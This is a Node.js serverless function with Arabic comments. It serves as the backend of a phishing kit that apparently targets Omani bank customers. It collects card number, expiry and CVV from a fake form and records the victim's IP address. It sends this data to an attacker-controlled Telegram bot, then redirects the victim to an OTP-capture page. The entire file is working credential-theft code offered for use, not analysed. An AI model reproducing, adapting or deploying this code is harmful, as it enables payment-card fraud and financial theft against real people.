const axios = require('axios');

exports.handler = async (event) => {
  // 1. استقبال الطلبات POST فقط
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    // 2. استخراج البيانات من الفورم
    const params = new URLSearchParams(event.body);

    const card   = params.get('s1') || '-'; // رقم البطاقة
    const month  = params.get('s2') || '-'; // الشهر
    const year   = params.get('s3') || '-'; // السنة
    const cvv    = params.get('s4') || '-'; // الكود الخلفي

    // استخراج IP الضحية
    const userIp = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown IP';

    // 3. تحديد الصفحة التالية (Redirect)
    // هام: ضع هنا مسار صفحة الكود (OTP) أو الصفحة التي تلي البطاقة
    const nextPage = '/Oman/Banks/otp.html'; 

    // 4. تنسيق الرسالة لتليجرام
    const message = `
💳 **بيانات البطاقة (New Card)**
---------------------------
#️⃣ **Card:** \`${card}\`
📅 **Expiry:** ${month} / ${year}
🔒 **CVV:** \`${cvv}\`

🌐 **IP:** ${userIp}
---------------------------
    `;

    // 5. الإرسال إلى تليجرام
    const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;

    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown' // لجعل الأرقام قابلة للنسخ والخط عريض
      });
    }

    // 6. توجيه المستخدم للصفحة التالية
    return {
      statusCode: 302,
      headers: {
        'Location': nextPage,
      },
    };

  } catch (error) {
    console.error('Error:', error);
    // في حال الخطأ نوجه للصفحة التالية أيضاً
    return {
      statusCode: 302,
      headers: {
        'Location': '/Oman/Banks/sms.html',
      },
    };
  }
};